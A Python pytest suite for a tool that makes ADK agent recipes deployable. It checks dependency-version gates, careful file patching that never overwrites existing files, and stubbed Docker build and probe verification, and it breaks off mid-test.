# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Tests for make_deployable.py.

The emphasis is on the GATES and on not-clobbering behaviour. Those are where
a bug is expensive: a gate that fails open silently crosses an ADK major or
overwrites a bespoke entrypoint, and neither shows up until someone runs the
recipe.
"""

import json
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import make_deployable as md
import pytest
import tomlkit

MIN_ADK = "2.6.0"

# Captured before the autouse `no_docker` fixture can replace it, so the
# detection tests exercise the real implementation rather than the stub that
# keeps every other test hermetic.
REAL_DETECT_DOCKER = md.detect_docker
REAL_LOAD_POLICY = md.load_policy


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


def write(path: Path, content: str) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(content).lstrip(), encoding="utf-8")
    return path


@pytest.fixture
def recipe(tmp_path: Path) -> Path:
    """A minimal recipe that should sail through every gate."""
    write(
        tmp_path / "pyproject.toml",
        """
        [project]
        name = "demo-recipe"
        requires-python = ">=3.11,<3.14"
        dependencies = [
            "google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",
        ]

        [build-system]
        requires = ["hatchling"]
        build-backend = "hatchling.build"

        [tool.hatch.build.targets.wheel]
        packages = ["app"]
        """,
    )
    write(
        tmp_path / "app" / "agent.py",
        """
        from google.adk.agents import Agent

        root_agent = Agent(name="demo")
        """,
    )
    write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "2.6.2"\n',
    )
    write(tmp_path / "manifest.yaml", "type: standalone\nlanguage: python\n")
    write(tmp_path / "README.md", "# demo\n")
    return tmp_path


@pytest.fixture(autouse=True)
def no_docker(monkeypatch):
    """Make every test hermetic by pretending docker is absent by default.

    `run()` probes docker on every invocation so the calling skill knows
    whether verification is offerable. Left unstubbed, the whole suite would
    shell out to the host's daemon and give different results on a laptop, in
    CI, and on a machine where someone happened to start Docker Desktop.
    Tests that care about docker override this explicitly.
    """
    monkeypatch.setattr(
        md, "detect_docker", lambda: (md.DOCKER_ABSENT, "stubbed for tests")
    )


@pytest.fixture(autouse=True)
def lock_is_current(monkeypatch):
    """Same hermeticity argument as `no_docker`, for `uv lock --check`.

    The follow-up todos shell out to uv when a run changed no dependency, and
    these fixtures are not resolvable uv projects — so the real call reports
    whatever the host's uv makes of a synthetic pyproject.toml, and a test
    asserting on todos would be asserting on that. Default to "current" and
    let the tests that care state the answer they mean.
    """
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda _d: (True, "stubbed for tests")
    )


# ---------------------------------------------------------------------------
# Detection
# ---------------------------------------------------------------------------


def test_finds_shallowest_agent_package(tmp_path: Path):
    """A nested sub-agent must never shadow the real package.

    The nested decoy is named to sort BEFORE the real package, so plain walk
    order would return it. Only genuine depth-ordering picks the right one —
    with the decoy named `subagents` the test passed even with the depth key
    stubbed to a constant.
    """
    write(tmp_path / "zz_app" / "agent.py", "root_agent = 1\n")
    write(tmp_path / "aa_outer" / "nested" / "agent.py", "root_agent = 2\n")
    agent_py, package_dir = md.find_agent_package(tmp_path)
    assert package_dir.name == "zz_app"
    assert agent_py == tmp_path / "zz_app" / "agent.py"


def test_ignores_agent_py_inside_venv(tmp_path: Path):
    """Every recipe here has an in-tree .venv full of other agents' code.

    The .venv copy is deliberately SHALLOWER than the real package: the
    search prefers the shallowest match, so if the skip-list were removed
    `.venv` would win. An equal-or-deeper decoy passes on depth alone and
    proves nothing about the skip-list at all.
    """
    write(tmp_path / ".venv" / "agent.py", "root_agent = 1\n")
    write(tmp_path / "src" / "horizon" / "agent.py", "root_agent = 1\n")
    _, package_dir = md.find_agent_package(tmp_path)
    assert package_dir.name == "horizon"


# ---------------------------------------------------------------------------
# Gate: declared specifier
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "spec",
    [
        "google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0",
        "google-adk>=2.0.0,<3.0.0",  # ceiling still admits 2.6
        "google-adk>=1.0.0",  # loose, admits everything
        "google-adk>=2.0.0a0",  # prerelease floor
    ],
)
def test_specifier_accepting_floor_is_clean(spec):
    check = md.check_adk_version_floor([spec], MIN_ADK, True)
    assert check.status == md.CLEAN


@pytest.mark.parametrize(
    "spec",
    [
        "google-adk>=1.15.0,<2.0.0",  # cross-session-memory
        "google-adk==1.31.0",  # oauth-user-consent-flow
        "google-adk<2",
    ],
)
def test_specifier_excluding_floor_blocks(spec):
    check = md.check_adk_version_floor([spec], MIN_ADK, True)
    assert check.status == md.NEEDS_INPUT


def test_missing_adk_dependency_blocks():
    check = md.check_adk_version_floor(["fastapi>=0.1"], MIN_ADK, True)
    assert check.status == md.NEEDS_INPUT


# ---------------------------------------------------------------------------
# Gate: locked version
#
# This is the gate that catches what the specifier cannot. A recipe pinning
# `google-adk>=1.0.0` passes the specifier check on paper while its lockfile
# says 1.28.0 — re-locking would cross a major silently.
# ---------------------------------------------------------------------------


def test_locked_on_older_major_blocks(tmp_path: Path):
    lock = write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "1.28.0"\n',
    )
    check = md.check_adk_locked_version(lock, MIN_ADK)
    assert check.status == md.NEEDS_INPUT
    assert "1.28.0" in check.message


def test_locked_below_floor_same_major_is_allowed(tmp_path: Path):
    """rag-agent-search sits at 2.3.0 — a minor bump, not a migration."""
    lock = write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "2.3.0"\n',
    )
    check = md.check_adk_locked_version(lock, MIN_ADK)
    assert check.status == md.REPORT_ONLY


def test_locked_at_or_above_floor_is_clean(tmp_path: Path):
    lock = write(
        tmp_path / "uv.lock",
        '[[package]]\nname = "google-adk"\nversion = "2.6.2"\n',
    )
    assert md.check_adk_locked_version(lock, MIN_ADK).status == md.CLEAN


def test_no_lockfile_reports_rather_than_guessing(tmp_path: Path):
    check = md.check_adk_locked_version(tmp_path / "uv.lock", MIN_ADK)
    assert check.status == md.REPORT_ONLY


# ---------------------------------------------------------------------------
# Gate: legacy app_utils
# ---------------------------------------------------------------------------


LEGACY = ["telemetry.py", "typing.py", "deploy.py", "memory_config.py"]


def test_legacy_app_utils_blocks(tmp_path: Path):
    write(tmp_path / "app" / "app_utils" / "telemetry.py", "x = 1\n")
    check = md.check_legacy_app_utils(tmp_path / "app", LEGACY)
    assert check.status == md.NEEDS_INPUT
    assert "telemetry.py" in check.details["legacy_files_present"]


def test_no_app_utils_is_clean(tmp_path: Path):
    (tmp_path / "app").mkdir()
    assert (
        md.check_legacy_app_utils(tmp_path / "app", LEGACY).status == md.CLEAN
    )


def test_new_generation_app_utils_is_clean(tmp_path: Path):
    """a2a.py/services.py are ours — re-running must not trip its own output."""
    write(tmp_path / "app" / "app_utils" / "a2a.py", "x = 1\n")
    write(tmp_path / "app" / "app_utils" / "services.py", "x = 1\n")
    assert (
        md.check_legacy_app_utils(tmp_path / "app", LEGACY).status == md.CLEAN
    )


# ---------------------------------------------------------------------------
# Gate: backing infra (selects the outcome, does not stop the run)
# ---------------------------------------------------------------------------


def test_infra_directory_downgrades_to_containerized(tmp_path: Path):
    (tmp_path / "app").mkdir()
    (tmp_path / "infra").mkdir()
    check = md.check_backing_infra(tmp_path, tmp_path / "app")
    assert check.status == md.REPORT_ONLY


def test_backing_service_import_detected(tmp_path: Path):
    write(tmp_path / "app" / "db.py", "import asyncpg\n")
    check = md.check_backing_infra(tmp_path, tmp_path / "app")
    assert check.status == md.REPORT_ONLY
    assert any("PostgreSQL" in r for r in check.details["reasons"])


def test_plain_recipe_is_deployable(tmp_path: Path):
    write(tmp_path / "app" / "agent.py", "root_agent = 1\n")
    assert md.check_backing_infra(tmp_path, tmp_path / "app").status == md.CLEAN


# ---------------------------------------------------------------------------
# Dependency patching
# ---------------------------------------------------------------------------


def _doc(deps: list[str]):
    import tomlkit

    body = ",\n".join(f'    "{d}"' for d in deps)
    return tomlkit.parse(
        f'[project]\nname = "x"\ndependencies = [\n{body}\n]\n'
    )


def test_missing_extras_are_merged_but_version_is_not_touched():
    """product-search pins bare `google-adk>=2.2.0`. The extras carry the
    OTel/GCP code the generated serving files import, so they must be added —
    but the version bound is the owner's deliberate choice and must survive.
    """
    doc = _doc(["google-adk>=2.2.0"])
    check = md.patch_dependencies(
        doc, ["google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"], apply=True
    )
    kept = check.details["kept"][0]
    assert kept["missing_extras"] == ["gcp", "otel-gcp"]
    # The recipe's own pin must be reported, never the policy's.
    assert kept["recipe_has"] == "google-adk>=2.2.0"
    assert "google-adk[gcp,otel-gcp]>=2.2.0" in str(doc)
    # The policy's floor must NOT have been imposed on the recipe.
    assert ">=2.6.0" not in str(doc)


def test_extras_merge_preserves_existing_extras_and_markers():
    doc = _doc(["google-adk[eval]>=2.2.0 ; python_version < '3.13'"])
    md.patch_dependencies(
        doc, ["google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"], apply=True
    )
    out = str(doc)
    assert "eval" in out and "gcp" in out and "otel-gcp" in out
    assert "python_version < " in out  # marker survived the rewrite
    assert ">=2.2.0" in out


def test_requirement_keeps_its_position_in_the_list():
    """Rewriting must not reorder a hand-curated dependency list."""
    doc = _doc(["aaa>=1", "google-adk>=2.2.0", "zzz>=1"])
    md.patch_dependencies(
        doc, ["google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"], apply=True
    )
    deps = [str(d) for d in doc["project"]["dependencies"]]
    assert deps[0] == "aaa>=1"
    assert deps[1].startswith("google-adk[")
    assert deps[2] == "zzz>=1"


def test_requirement_already_carrying_extras_is_untouched():
    doc = _doc(["google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"])
    before = str(doc)
    check = md.patch_dependencies(
        doc, ["google-adk[gcp,otel-gcp]>=2.6.0,<3.0.0"], apply=True
    )
    assert check.status == md.CLEAN
    assert str(doc) == before


def test_existing_requirement_is_never_widened():
    doc = _doc(["aiohttp>=3.0"])
    md.patch_dependencies(doc, ["aiohttp>=3.13.4"], apply=True)
    assert "aiohttp>=3.0" in str(doc)
    assert "aiohttp>=3.13.4" not in str(doc)


def test_missing_dependency_is_added():
    doc = _doc(["google-adk>=2.6.0"])
    check = md.patch_dependencies(doc, ["gcsfs>=2024.11.0"], apply=True)
    assert check.status == md.FIXED
    assert "gcsfs>=2024.11.0" in str(doc)


# ---------------------------------------------------------------------------
# agent.py patching
# ---------------------------------------------------------------------------


def test_app_object_appended_with_import(tmp_path: Path):
    agent = write(
        tmp_path / "agent.py",
        """
        from google.adk.agents import Agent

        root_agent = Agent(name="d")
        """,
    )
    check = md.patch_app_object(agent, "app", apply=True)
    assert check.status == md.FIXED
    text = agent.read_text()
    assert "from google.adk.apps import App" in text
    assert 'app = App(root_agent=root_agent, name="app")' in text
    # Must remain parseable, and the App must come after root_agent.
    assert text.index("root_agent =") < text.index("app = App(")


def test_existing_app_is_left_alone(tmp_path: Path):
    agent = write(
        tmp_path / "agent.py",
        """
        from google.adk.apps import App

        root_agent = 1
        app = App(root_agent=root_agent, name="x")
        """,
    )
    before = agent.read_text()
    assert md.patch_app_object(agent, "app", apply=True).status == md.CLEAN
    assert agent.read_text() == before


def test_missing_root_agent_blocks(tmp_path: Path):
    agent = write(tmp_path / "agent.py", "something_else = 1\n")
    assert (
        md.patch_app_object(agent, "app", apply=True).status == md.NEEDS_INPUT
    )


# ---------------------------------------------------------------------------
# manifest.yaml — one-line edit, no reflow
# ---------------------------------------------------------------------------


def test_manifest_edit_is_surgical(tmp_path: Path):
    """A ruamel round-trip re-indents every sequence and wraps long scalars,
    turning a one-key addition into a whole-file restyle."""
    manifest = write(
        tmp_path / "manifest.yaml",
        """
        type: standalone
        language: python
        description: A very long description that a YAML dumper would happily hard-wrap onto a second line if given the chance.
        tags:
          - retail
          - search
        """,
    )
    before = manifest.read_text().splitlines()
    md.patch_manifest_deployable(manifest, infra_clean=True, apply=True)
    after = manifest.read_text().splitlines()

    assert "deployable: true" in after
    assert len(after) == len(before) + 1
    # Every original line survives byte-for-byte.
    for line in before:
        assert line in after


def test_manifest_untouched_when_infra_needed(tmp_path: Path):
    manifest = write(tmp_path / "manifest.yaml", "type: standalone\n")
    before = manifest.read_text()
    check = md.patch_manifest_deployable(
        manifest, infra_clean=False, apply=True
    )
    assert check.status == md.REPORT_ONLY
    assert manifest.read_text() == before


# ---------------------------------------------------------------------------
# Dockerfile rendering
# ---------------------------------------------------------------------------


def test_python_version_comes_from_the_recipe():
    """The vendored template hardcodes 3.12; recipes target 3.11-3.13."""
    out = md.set_python_base_image("FROM python:3.12-slim\n", "3.11")
    assert out == "FROM python:3.11-slim\n"


@pytest.mark.parametrize(
    ("requires", "expected"),
    [
        (">=3.11,<3.14", "3.11"),
        (">=3.12", "3.12"),
        ("", None),
        (None, None),
    ],
)
def test_python_floor_parsing(requires, expected):
    assert md.python_floor_from_requires(requires) == expected


def test_data_dirs_copied_before_uv_sync(tmp_path: Path):
    """Layer order matters: data must land before `uv sync`."""
    dockerfile = "COPY ./app ./app\n\nRUN uv sync --frozen\n"
    out = md.inject_data_dir_copies(
        dockerfile, "app", ["assets", "sample_data"]
    )
    assert out.index("COPY ./assets ./assets") < out.index("RUN uv sync")
    assert "COPY ./sample_data ./sample_data" in out


def test_no_data_dirs_leaves_dockerfile_untouched():
    dockerfile = "COPY ./app ./app\n"
    assert md.inject_data_dir_copies(dockerfile, "app", []) == dockerfile


# ---------------------------------------------------------------------------
# End-to-end
# ---------------------------------------------------------------------------


def test_dry_run_writes_nothing(recipe: Path, monkeypatch):
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    report = md.run(
        recipe_dir=recipe,
        apply=False,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    # `-unverified` because no docker evidence was gathered — the static
    # assessment is unchanged, only its confidence is now stated.
    assert report.outcome == md.OUTCOME_DEPLOYABLE_UNVERIFIED
    assert report.files_written == []
    assert not (recipe / "Dockerfile").exists()


def test_apply_writes_every_required_file(recipe: Path, monkeypatch):
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    for rel in [
        "Dockerfile",
        ".dockerignore",
        "app/fast_api_app.py",
        "app/app_utils/a2a.py",
        "app/app_utils/services.py",
        "app/app_utils/reasoning_engine_adapter.py",
    ]:
        assert (recipe / rel).is_file(), rel
    # Placeholders must be fully substituted.
    text = (recipe / "app" / "fast_api_app.py").read_text()
    assert md.PLACEHOLDER_PACKAGE not in text
    assert md.PLACEHOLDER_PROJECT not in text
    assert "from app.app_utils import services" in text


def test_existing_serving_file_not_clobbered(recipe: Path, monkeypatch):
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    bespoke = write(recipe / "app" / "fast_api_app.py", "# hand written\n")
    md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert bespoke.read_text() == "# hand written\n"


def test_blocked_run_writes_nothing(recipe: Path, monkeypatch):
    """A gate must stop before ANY file is written — a half-converted recipe
    is worse than an unconverted one."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    write(recipe / "app" / "app_utils" / "telemetry.py", "x = 1\n")
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
    )
    assert report.outcome == md.OUTCOME_BLOCKED
    assert report.files_written == []
    assert not (recipe / "Dockerfile").exists()


def _policy() -> dict:
    """The REAL `deployability:` policy, not a hand-written imitation.

    Loading the shipped .github/policy.yml is deliberate. A local dict drifts
    the moment someone adds a key to the real file, and every test then runs
    against a schema the production code never sees — which is exactly how
    `required_files` sat unread by anything with the suite still green. If a
    change to the real policy breaks these tests, that is the signal working,
    not noise.
    """
    repo_root = Path(__file__).resolve().parents[4]
    assert (repo_root / ".github" / "policy.yml").is_file(), (
        f"expected the real policy under {repo_root}"
    )
    # REAL_LOAD_POLICY, not md.load_policy: tests monkeypatch the latter to
    # call this very function, which would recurse forever.
    return dict(REAL_LOAD_POLICY(repo_root))


# ---------------------------------------------------------------------------
# agents-cli-manifest.yaml
#
# The file is functional: agents-cli uses it as the project-root marker and
# reads create_params.deployment_target. So it must be both PRESENT and
# free of invented provenance.
# ---------------------------------------------------------------------------


def test_acli_manifest_omits_fabricated_provenance(tmp_path: Path):
    """A fake acli_version makes the CLI tell the owner to run
    `agents-cli scaffold upgrade` on a project that was never scaffolded."""
    check = md.write_agents_cli_manifest(
        tmp_path,
        project_name="demo",
        agent_directory="app",
        region="us-east1",
        apply=True,
    )
    assert check.status == md.FIXED
    text = (tmp_path / "agents-cli-manifest.yaml").read_text()
    for fabricated in ("acli_version", "generated_at", "base_template"):
        assert f"\n{fabricated}:" not in text


def test_acli_manifest_is_loadable_by_agents_cli_shape(tmp_path: Path):
    """Mirror ProjectConfig.from_dict: the values agents-cli actually reads."""
    from ruamel.yaml import YAML

    md.write_agents_cli_manifest(
        tmp_path,
        project_name="demo",
        agent_directory="horizon",
        region="us-central1",
        apply=True,
    )
    data = YAML(typ="safe").load(
        (tmp_path / "agents-cli-manifest.yaml").read_text()
    )
    assert data["name"] == "demo"
    assert data["agent_directory"] == "horizon"
    assert data["region"] == "us-central1"
    assert data["language"] == "python"
    assert data["create_params"]["deployment_target"] == "cloud_run"
    assert data["create_params"]["is_a2a"] is True


def test_acli_manifest_never_clobbers_an_existing_one(tmp_path: Path):
    existing = write(tmp_path / "agents-cli-manifest.yaml", "name: mine\n")
    check = md.write_agents_cli_manifest(
        tmp_path,
        project_name="other",
        agent_directory="app",
        region="us-east1",
        apply=True,
    )
    assert check.status == md.REPORT_ONLY
    assert existing.read_text() == "name: mine\n"


def test_guidance_filename_follows_what_the_recipe_ships(tmp_path: Path):
    assert md.detect_guidance_filename(tmp_path) == "AGENTS.md"
    write(tmp_path / "GEMINI.md", "x")
    assert md.detect_guidance_filename(tmp_path) == "GEMINI.md"
    write(tmp_path / "AGENTS.md", "x")
    assert md.detect_guidance_filename(tmp_path) == "AGENTS.md"


# ---------------------------------------------------------------------------
# already-deployable advisory
#
# long-horizon-harness ships a Dockerfile and a bespoke ~400-line
# fast_api_app.py with its own A2A wiring. Generating app_utils/ alongside it
# produces dead code, so the owner gets warned first.
# ---------------------------------------------------------------------------


def test_recipe_that_already_serves_is_flagged(tmp_path: Path):
    write(tmp_path / "Dockerfile", "FROM python:3.11-slim\n")
    write(tmp_path / "horizon" / "fast_api_app.py", "app = 1\n")
    check = md.check_already_deployable(tmp_path, tmp_path / "horizon")
    assert check.status == md.REPORT_ONLY


def test_dockerfile_without_entrypoint_is_not_flagged(tmp_path: Path):
    write(tmp_path / "Dockerfile", "FROM python:3.11-slim\n")
    (tmp_path / "app").mkdir()
    assert (
        md.check_already_deployable(tmp_path, tmp_path / "app").status
        == md.CLEAN
    )


def test_fresh_recipe_is_not_flagged(tmp_path: Path):
    (tmp_path / "app").mkdir()
    assert (
        md.check_already_deployable(tmp_path, tmp_path / "app").status
        == md.CLEAN
    )


# ---------------------------------------------------------------------------
# Docker detection
#
# Three states, not two. The middle one — a binary that exists but a daemon
# that will not answer — is the common developer case (Docker Desktop not
# started, or a socket the user has no permission for). Reporting it as an
# error would make the normal case look broken, so all three are asserted
# separately, including that none of them is ERROR.
# ---------------------------------------------------------------------------


def _fake_docker(returncode: int, stdout: str = "", stderr: str = ""):
    """Build a _docker() replacement returning a fixed CompletedProcess."""

    def fake(args, timeout=60):
        return subprocess.CompletedProcess(
            args=["docker", *args],
            returncode=returncode,
            stdout=stdout,
            stderr=stderr,
        )

    return fake


def test_docker_absent_when_no_binary(monkeypatch):
    monkeypatch.setattr(md.shutil, "which", lambda _: None)
    state, detail = REAL_DETECT_DOCKER()
    assert state == md.DOCKER_ABSENT
    assert "PATH" in detail


def test_docker_unreachable_when_daemon_down(monkeypatch):
    monkeypatch.setattr(md.shutil, "which", lambda _: "/usr/bin/docker")
    monkeypatch.setattr(
        md,
        "_docker",
        _fake_docker(1, stderr="Cannot connect to the Docker daemon"),
    )
    state, detail = REAL_DETECT_DOCKER()
    assert state == md.DOCKER_UNREACHABLE
    assert "Cannot connect" in detail


def test_docker_usable_when_daemon_answers(monkeypatch):
    monkeypatch.setattr(md.shutil, "which", lambda _: "/usr/bin/docker")
    monkeypatch.setattr(md, "_docker", _fake_docker(0, stdout="29.6.1\n"))
    state, detail = REAL_DETECT_DOCKER()
    assert state == md.DOCKER_USABLE
    assert "29.6.1" in detail


@pytest.mark.parametrize(
    "state", [md.DOCKER_ABSENT, md.DOCKER_UNREACHABLE, md.DOCKER_USABLE]
)
def test_no_docker_state_is_ever_an_error(state):
    """A stopped daemon is an absence of evidence, never a failure."""
    check = md.check_docker(state, "detail")
    assert check.status == md.REPORT_ONLY
    assert check.details["docker_state"] == state


def test_unavailable_states_say_they_are_not_a_failure():
    for state in (md.DOCKER_ABSENT, md.DOCKER_UNREACHABLE):
        message = md.check_docker(state, "detail").message
        assert "not a failure" in message
        assert "unverified" in message


def test_docker_timeout_is_reported_as_unreachable(monkeypatch):
    """A hanging daemon must not propagate an exception out of detection."""
    monkeypatch.setattr(md.shutil, "which", lambda _: "/usr/bin/docker")

    def boom(args, timeout=60, **_):
        raise subprocess.TimeoutExpired(cmd="docker", timeout=timeout)

    monkeypatch.setattr(md.subprocess, "run", boom)
    assert REAL_DETECT_DOCKER()[0] == md.DOCKER_UNREACHABLE


# ---------------------------------------------------------------------------
# Outcome vocabulary
#
# The whole point of the feature: a reader must never mistake an assumed
# result for a proven one.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "infra_clean,verified,expected",
    [
        (True, True, md.OUTCOME_DEPLOYABLE_VERIFIED),
        (True, None, md.OUTCOME_DEPLOYABLE_UNVERIFIED),
        (False, True, md.OUTCOME_CONTAINERIZED_VERIFIED),
        (False, None, md.OUTCOME_CONTAINERIZED_UNVERIFIED),
        # A proven failure outranks the infra axis entirely.
        (True, False, md.OUTCOME_VERIFICATION_FAILED),
        (False, False, md.OUTCOME_VERIFICATION_FAILED),
    ],
)
def test_outcome_matrix(infra_clean, verified, expected):
    assert (
        md.outcome_for(infra_clean=infra_clean, verified=verified) == expected
    )


def test_verified_and_unverified_are_distinguishable():
    """Guards against a refactor that collapses the evidence axis."""
    assert md.OUTCOME_DEPLOYABLE_VERIFIED != md.OUTCOME_DEPLOYABLE_UNVERIFIED
    assert "unverified" in md.OUTCOME_DEPLOYABLE_UNVERIFIED
    assert "unverified" not in md.OUTCOME_DEPLOYABLE_VERIFIED


# ---------------------------------------------------------------------------
# Verification: build, probe, cleanup
# ---------------------------------------------------------------------------


class FakeDocker:
    """Records docker invocations and replays scripted results.

    Keyed on the subcommand so a test can make `build` fail while leaving
    `rm`/`rmi` working — which is what proves cleanup still runs on the
    failure path.
    """

    def __init__(self, results=None):
        self.calls: list[list[str]] = []
        self.results = results or {}

    def __call__(self, args, timeout=60):
        self.calls.append(list(args))
        code, out, err = self.results.get(args[0], (0, "", ""))
        return subprocess.CompletedProcess(
            args=["docker", *args], returncode=code, stdout=out, stderr=err
        )

    def subcommands(self) -> list[str]:
        return [c[0] for c in self.calls]


SETTINGS = {
    "probe_port": 8080,
    "build_timeout_seconds": 60,
    "ready_timeout_seconds": 5,
    "probe_paths": ["/list-apps", "/a2a/<pkg>/.well-known/agent-card.json"],
    "container_env": {"INTEGRATION_TEST": "1"},
}


def test_build_failure_returns_false_and_reports_loudly(
    tmp_path: Path, monkeypatch
):
    fake = FakeDocker({"build": (1, "", "failed to solve: no such file")})
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    assert result is False
    build = next(c for c in report.checks if c.id == "container-build")
    assert build.status == md.ERROR
    assert "DOES NOT BUILD" in build.message
    # Never ran the container after a failed build.
    assert "run" not in fake.subcommands()


def test_build_failure_still_cleans_up(tmp_path: Path, monkeypatch):
    fake = FakeDocker({"build": (1, "", "boom")})
    monkeypatch.setattr(md, "_docker", fake)
    md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=md.Report(recipe_dir=str(tmp_path), mode="apply"),
    )
    # The image tag is removed even though the build failed: a partial build
    # can still leave a tagged layer behind.
    assert "rmi" in fake.subcommands()


def test_successful_verification_probes_and_cleans_up(
    tmp_path: Path, monkeypatch
):
    fake = FakeDocker({"port": (0, "127.0.0.1:54321\n", "")})
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (200, "['app']"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    assert result is True
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert serves.status == md.CLEAN
    # Container AND image removed AFTER the run. Asserting mere presence of
    # "rm" is not enough: verify_container issues a stale-leftover `rm` before
    # `docker run`, so that assertion passes even if cleanup never happens and
    # a container is left running.
    subs = fake.subcommands()
    assert "run" in subs
    after_run = subs[subs.index("run") :]
    assert "rm" in after_run, f"container not removed after run: {subs}"
    assert "rmi" in after_run, f"image not removed after run: {subs}"


def test_agent_card_404_does_not_claim_a2a_support(tmp_path: Path, monkeypatch):
    """Serving is not the same as being A2A-capable, and must not round up."""
    fake = FakeDocker({"port": (0, "127.0.0.1:54321\n", "")})
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(
        md,
        "_probe",
        lambda url, timeout=10: (
            (200, "ok") if "list-apps" in url else (404, "")
        ),
    )
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=True,
        report=report,
    )

    # The image genuinely builds and serves, so this is not a failure...
    assert result is True
    a2a = next(c for c in report.checks if c.id == "container-a2a")
    # ...but the A2A claim is explicitly withheld.
    assert a2a.status == md.REPORT_ONLY
    assert "did NOT take effect" in a2a.message
    assert "not describe this recipe as A2A-capable" in a2a.message


def test_container_that_exits_early_fails_fast(tmp_path: Path, monkeypatch):
    """A crash on import must not hold the run hostage for the full timeout."""
    fake = FakeDocker(
        {"port": (0, "127.0.0.1:54321\n", ""), "inspect": (0, "false\n", "")}
    )
    monkeypatch.setattr(md, "_docker", fake)
    monkeypatch.setattr(md, "_probe", lambda url, timeout=10: (0, "refused"))
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings={**SETTINGS, "ready_timeout_seconds": 600},
        may_run=True,
        report=report,
    )

    assert result is False
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert "exited before it began serving" in serves.message


def test_off_allowlist_recipe_is_built_but_not_run(tmp_path: Path, monkeypatch):
    """Trap 4: some recipes create real GCP resources at import."""
    fake = FakeDocker()
    monkeypatch.setattr(md, "_docker", fake)
    report = md.Report(recipe_dir=str(tmp_path), mode="apply")

    result = md.verify_container(
        recipe_dir=tmp_path,
        package="app",
        settings=SETTINGS,
        may_run=False,
        report=report,
    )

    # Build success alone is NOT a pass — the app was never proven to serve.
    assert result is None
    assert "run" not in fake.subcommands()
    serves = next(c for c in report.checks if c.id == "container-serves")
    assert "not on" in serves.message and "run_allowlist" in serves.message


def test_build_failure_hint_names_the_lockfile_cause():
    proc = subprocess.CompletedProcess(
        args=[], returncode=1, stdout="", stderr="the lockfile is out of date"
    )
    assert "uv lock" in md._build_failure_hint(proc)


def test_parse_host_port():
    assert md._parse_host_port("127.0.0.1:54321\n") == "54321"
    assert md._parse_host_port("") is None
    assert md._parse_host_port("nonsense") is None


# ---------------------------------------------------------------------------
# Verification wired through run(): the gate on manifest.deployable
#
# These assert the FILE ON DISK, not just the reported status. The whole
# feature is the promise that a recipe proven broken does not get flagged
# deployable, and only the file proves that.
# ---------------------------------------------------------------------------


def _run_with_docker(recipe: Path, monkeypatch, *, state, lock_ok, verified):
    """Drive run() with docker, lockfile and verification all stubbed."""
    monkeypatch.setattr(md, "load_policy", lambda _root: _policy())
    monkeypatch.setattr(md, "find_repo_root", lambda _p: recipe)
    monkeypatch.setattr(md, "detect_docker", lambda: (state, "stubbed"))
    monkeypatch.setattr(
        md, "lockfile_is_current", lambda *a, **k: (lock_ok, "stubbed")
    )
    seen: dict[str, bool] = {"verified": False}

    def fake_verify(**kwargs):
        seen["verified"] = True
        return verified

    monkeypatch.setattr(md, "verify_container", fake_verify)
    report = md.run(
        recipe_dir=recipe,
        apply=True,
        overwrite=False,
        data_dirs=[],
        region="us-east1",
        verify_container_requested=True,
    )
    return report, seen


def test_failed_verification_does_not_flag_the_manifest(
    recipe: Path, monkeypatch
):
    report, seen = _run_with_docker(
        recipe,
        monkeypatch,
        state=md.DOCKER_USABLE,
        lock_ok=True,
        verified=False,
    )
    assert seen["verified"]
